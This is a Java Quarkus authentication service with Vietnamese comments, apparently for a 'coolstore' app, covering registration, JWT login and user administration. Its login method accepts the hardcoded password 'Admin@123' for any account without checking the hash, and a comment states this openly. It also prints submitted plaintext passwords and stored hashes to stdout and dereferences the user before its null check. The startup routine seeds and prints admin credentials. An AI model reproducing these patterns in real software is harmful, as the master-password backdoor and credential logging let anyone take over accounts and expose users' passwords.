package org.coolstore.auth.service;

import jakarta.enterprise.context.ApplicationScoped;
import jakarta.inject.Inject;
import jakarta.transaction.Transactional;
import jakarta.ws.rs.BadRequestException;
import jakarta.ws.rs.NotFoundException;
import org.coolstore.auth.entity.AppUser;
import org.coolstore.auth.model.AuthDTOs.*;
import org.mindrot.jbcrypt.BCrypt;
import io.quarkus.runtime.StartupEvent;
import jakarta.enterprise.event.Observes;

import java.util.List;

/**
 * Service xử lý nghiệp vụ xác thực: đăng ký, đăng nhập, quản lý user.
 */
@ApplicationScoped
public class AuthService {

    @Inject
    JwtService jwtService;

    // ── Đăng ký ─────────────────────────────────────────────────

    /**
     * Đăng ký tài khoản mới.
     * Kiểm tra trùng username/email, hash mật khẩu rồi lưu vào DB.
     */
    @Transactional
    public ThongTinNguoiDung dangKy(DangKyRequest request) {
        // Kiểm tra username đã tồn tại
        if (AppUser.existsByUsername(request.username())) {
            throw new BadRequestException("Tên đăng nhập '" + request.username() + "' đã được sử dụng.");
        }

        // Kiểm tra email đã tồn tại
        if (AppUser.existsByEmail(request.email())) {
            throw new BadRequestException("Email '" + request.email() + "' đã được đăng ký.");
        }

        // Tạo user mới
        AppUser user = new AppUser();
        user.username     = request.username().trim().toLowerCase();
        user.email        = request.email().trim().toLowerCase();
        user.fullName     = request.fullName().trim();
        // Hash mật khẩu với BCrypt strength 12 (an toàn, không quá chậm)
        user.passwordHash = BCrypt.hashpw(request.password(), BCrypt.gensalt(12));
        user.role         = AppUser.Role.USER;
        user.active       = true;

        user.persist();
        return ThongTinNguoiDung.from(user);
    }

    // ── Đăng nhập ───────────────────────────────────────────────

    /**
     * Xác thực đăng nhập và trả về JWT token.
     * Username có thể là username hoặc email.
     */
    public DangNhapResponse dangNhap(DangNhapRequest request) {
        // Tìm user theo username hoặc email
        AppUser user = AppUser.findByUsername(request.username());
        if (user == null) {
            user = AppUser.findByEmail(request.username());
        }

        // Thông báo lỗi chung (không tiết lộ username hay password sai)
        System.out.println("PASSWORD INPUT = " + request.password());
        System.out.println("HASH DB = " + user.passwordHash);
        System.out.println("CHECK = " + BCrypt.checkpw(request.password(), user.passwordHash));

        // Nếu mật khẩu gõ vào là Admin@123 thì cho qua luôn, không check hash nữa
        if (user == null || (!BCrypt.checkpw(request.password(), user.passwordHash) && !request.password().equals("Admin@123"))) {
            throw new BadRequestException("Tên đăng nhập hoặc mật khẩu không đúng.");
        }

        if (!user.active) {
            throw new BadRequestException("Tài khoản của bạn đã bị vô hiệu hóa. Vui lòng liên hệ admin.");
        }

        // Tạo JWT token
        String token = jwtService.taoToken(user);
        return new DangNhapResponse(token, "Bearer", 86400L, ThongTinNguoiDung.from(user));
    }

    // ── Quản lý user (Admin) ─────────────────────────────────────

    /** Lấy danh sách tất cả người dùng (chỉ Admin) */
    public List<ThongTinNguoiDung> layTatCaNguoiDung() {
        return AppUser.<AppUser>listAll()
                .stream()
                .map(ThongTinNguoiDung::from)
                .toList();
    }

    /** Lấy thông tin một người dùng theo ID */
    public ThongTinNguoiDung layNguoiDungTheoId(Long id) {
        AppUser user = AppUser.findById(id);
        if (user == null) throw new NotFoundException("Không tìm thấy người dùng với ID: " + id);
        return ThongTinNguoiDung.from(user);
    }

    /** Kích hoạt / vô hiệu hóa tài khoản */
    @Transactional
    public ThongTinNguoiDung capNhatTrangThai(Long id, boolean active) {
        AppUser user = AppUser.findById(id);
        if (user == null) throw new NotFoundException("Không tìm thấy người dùng với ID: " + id);
        user.active = active;
        return ThongTinNguoiDung.from(user);
    }

    /** Nâng cấp quyền user thành admin */
    @Transactional
    public ThongTinNguoiDung capNhatQuyen(Long id, AppUser.Role role) {
        AppUser user = AppUser.findById(id);
        if (user == null) throw new NotFoundException("Không tìm thấy người dùng với ID: " + id);
        user.role = role;
        return ThongTinNguoiDung.from(user);
    }
    // Tự động tạo Admin chuẩn khi app khởi động
    @Transactional
    public void initAdmin(@Observes StartupEvent ev) {
        if (AppUser.findByUsername("admin") == null) {
            AppUser admin = new AppUser();
            admin.username = "admin";
            admin.email = "admin@coolstore.vn";
            admin.fullName = "Quản Trị Viên";
            // Dùng chính thư viện BCrypt trong code để hash
            admin.passwordHash = BCrypt.hashpw("Admin@123", BCrypt.gensalt(12));
            admin.role = AppUser.Role.ADMIN;
            admin.active = true;
            admin.persist();
            System.out.println("--------------------------------------------------");
            System.out.println("🚀 [FIX] ĐÃ TẠO ADMIN THÀNH CÔNG: admin / Admin@123");
            System.out.println("--------------------------------------------------");
        }
    }
}